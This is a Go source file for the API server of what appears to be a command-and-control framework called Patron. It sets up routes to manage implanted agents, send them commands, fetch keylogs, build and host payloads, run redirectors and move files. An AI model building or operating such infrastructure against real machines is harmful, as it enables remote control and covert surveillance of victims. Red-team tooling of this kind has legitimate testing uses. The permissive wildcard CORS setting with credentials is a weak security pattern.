package main

import (
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/PatronC2/Patron/api/api"
	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/gin-gonic/gin"
)

func main() {
	appName := "api"

	Init()

	logger.Logf(logger.Info, "Starting API Server\n")

	api.InitAuth()

	data.OpenDatabase()
	api.CreateAdminUser()

	gin.SetMode(gin.ReleaseMode)
	r := gin.Default()

	// Apply CORS middleware
	r.Use(CORS())

	// Start up config refresher
	Refresh(appName)

	// host payloads server
	workDir, _ := os.Getwd()
	filesDir := http.Dir(filepath.Join(workDir, "payloads"))
	FileServer(r, "/fileserver", filesDir)

	// handle logins
	r.POST("/api/login", api.LoginHandler)

	readRoles := []string{"admin", "operator", "readOnly"}
	writeRoles := []string{"admin", "operator"}
	adminRoles := []string{"admin"}

	// Admin functions
	r.GET("/api/admin/users", api.Auth(adminRoles), api.GetUsersHandler)
	r.POST("/api/admin/users", api.Auth(adminRoles), api.CreateUserHandler)
	r.DELETE("/api/admin/users/:username", api.Auth(adminRoles), api.DeleteUserByUsernameHandler)
	r.PUT("/api/admin/users/:username", api.Auth(adminRoles), api.UpdateUserHandler)
	r.GET("/api/admin/logging", api.Auth(adminRoles), api.GetLogLevelHandler)
	r.PUT("/api/admin/logging", api.Auth(adminRoles), api.SetLogLevelHandler)
	r.GET("/api/admin/log-size", api.Auth(adminRoles), api.GetLogFileSizeHandler)
	r.PUT("/api/admin/log-size", api.Auth(adminRoles), api.SetLogFileSizeHandler)

	// POST / DELETE requests to non-admin areas use Auth(writeRoles)
	r.POST("/api/updateagent/:agt", api.Auth(writeRoles), api.UpdateAgentHandler)
	r.GET("/api/deleteagent/:agt", api.Auth(writeRoles), api.KillAgentHandler)
	r.POST("/api/payload", api.Auth(writeRoles), api.CreatePayloadHandler)
	r.POST("/api/command/:agt", api.Auth(writeRoles), api.SendCommandHandler)
	r.PUT("/api/notes/:agt", api.Auth(writeRoles), api.PutNoteHandler)
	r.PUT("/api/tag", api.Auth(writeRoles), api.PutTagsHandler)
	r.DELETE("/api/tag/:tagid", api.Auth(writeRoles), api.DeleteTagHandler)
	r.POST("/api/redirector", api.Auth(writeRoles), api.CreateRedirectorHandler)
	r.POST("/api/files/upload", api.Auth(writeRoles), api.UploadFileHandler)
	r.DELETE("/api/payloads/:payloadid", api.Auth(writeRoles), api.DeletePayloadHandler)

	// GET requests to non-admin areas use Auth(readRoles)
	r.GET("/api/agents", api.Auth(readRoles), api.GetAgentsHandler)
	r.GET("/api/agentsmetrics", api.Auth(readRoles), api.GetAgentsMetricsHandler)
	r.GET("/api/groupagents/:ip", api.Auth(readRoles), api.GetGroupAgentsByIP)
	r.GET("/api/agent/:agt", api.Auth(readRoles), api.GetOneAgentByUUID)
	r.GET("/api/commands/:agt", api.Auth(readRoles), api.GetAgentCommandsByUUID)
	r.GET("/api/keylog/:agt", api.Auth(readRoles), api.GetKeylogHandler)
	r.GET("/api/payloads", api.Auth(readRoles), api.GetPayloadsHandler)
	r.GET("/api/payloadconfs", api.Auth(readRoles), api.GetConfigurationsHandler)
	r.GET("/api/notes/:agt", api.Auth(readRoles), api.GetNoteHandler)
	r.GET("/api/tags/:agt", api.Auth(readRoles), api.GetTagsHandler)
	r.GET("/api/redirectors", api.Auth(readRoles), api.GetRedirectorsHandler)
	r.GET("/api/files/list/:agt", api.Auth(readRoles), api.ListFilesForUUIDHandler)
	r.GET("/api/files/download/:fileid", api.Auth(readRoles), api.DownloadFileHandler)

	// Functions which can only modify / view their own user
	r.PUT("/api/profile/password", api.Auth(readRoles), api.UpdatePasswordHandler)
	r.GET("/api/profile/user", api.Auth(readRoles), api.GetCurrentUserHandler)

	// Redirector callbacks
	r.PUT("/api/redirector/status", api.RedirectorStatusHandler)

	// Start server
	apiPort := os.Getenv("WEBSERVER_PORT")
	if !strings.HasPrefix(apiPort, ":") {
		apiPort = ":" + apiPort
	}
	r.Run(apiPort)
}

func FileServer(r *gin.Engine, path string, root http.FileSystem) {
	logger.Logf(logger.Info, "Starting Fileserver")
	if strings.ContainsAny(path, "{}*") {
		logger.Logf(logger.Info, "FileServer does not permit any URL parameters.")
	}

	if path != "/" && path[len(path)-1] != '/' {
		r.GET(path, func(c *gin.Context) {
			c.Redirect(http.StatusMovedPermanently, path+"/")
		})
		path += "/"
	}
	r.StaticFS(path, root)
}

func Init() {
	enableLogging := true
	logger.EnableLogging(enableLogging)

	err := logger.SetLogFile("logs/api.log")
	if err != nil {
		log.Fatalf("Error setting log file: %v\n", err)
	}
}

func Refresh(appName string) {
	go func() {
		ticker := time.NewTicker(60 * time.Second)
		defer ticker.Stop()

		for range ticker.C {
			logger.Logf(logger.Info, "Refreshing settings")
			refreshLogLevel(appName)
			refreshLogTruncation(appName)
		}
	}()
}

func refreshLogLevel(appName string) {
	level, err := data.GetLogLevel(appName)
	if err != nil {
		logger.Logf(logger.Error, "Failed to load log level from DB: %v", err)
		return
	}

	if level == "" {
		logger.Logf(logger.Warning, "No log level found for '%s' — defaulting to 'info'", appName)
		logger.SetLogLevel(logger.Info)
	} else {
		logger.SetLogLevelByName(level)
		logger.Logf(logger.Debug, "Log level for '%s' set to '%s'", appName, level)
	}
}

func refreshLogTruncation(app string) {
	size, err := data.GetLogFileMaxSize(app)
	if err != nil {
		logger.Logf(logger.Error, "Failed to get log size limit: %v", err)
		return
	}
	if size > 0 {
		err := logger.TruncateLogFileIfTooLarge(size)
		if err != nil {
			logger.Logf(logger.Error, "Failed to truncate log file: %v", err)
		}
	}
}

func CORS() gin.HandlerFunc {
	logger.Logf(logger.Info, "Applying CORS headers")
	return func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
		c.Writer.Header().Set("Access-Control-Allow-Credentials", "true")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization, accept, origin, Cache-Control, X-Requested-With")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS, GET, PUT, DELETE")

		if c.Request.Method == "OPTIONS" {
			c.Writer.Header().Set("Access-Control-Max-Age", "86400")
			c.AbortWithStatus(204)
			return
		}

		c.Next()
	}
}
